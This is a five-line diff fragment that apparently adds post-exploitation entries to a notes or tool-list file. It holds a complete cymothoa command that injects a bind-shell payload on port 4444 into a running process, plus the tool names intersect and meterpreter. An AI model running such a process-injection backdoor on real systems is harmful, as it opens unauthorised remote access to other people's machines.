@@ -1,0 +1,5 @@
+cymothoa -p 4255 -s 1 -y 4444
+
+intersect
+
+meterpreter
